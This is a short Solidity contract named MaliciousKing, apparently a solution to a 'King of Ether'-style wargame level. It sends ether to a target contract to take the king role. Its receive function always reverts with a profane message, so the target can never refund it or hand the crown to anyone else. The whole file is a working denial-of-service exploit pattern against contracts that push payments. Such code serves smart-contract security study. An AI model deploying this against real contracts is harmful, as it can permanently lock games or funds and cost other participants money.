// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MaliciousKing {
    event Response(bool success, bytes data);
    address king;

    constructor(address _address) payable {
        king = _address;
    }

    function becomeKing() public payable {
        (bool success, bytes memory data) = king.call{value: msg.value}('');
        emit Response(success, data);
    }

    receive() external payable {
        revert("Fuck you! I'm the king");
    }
}
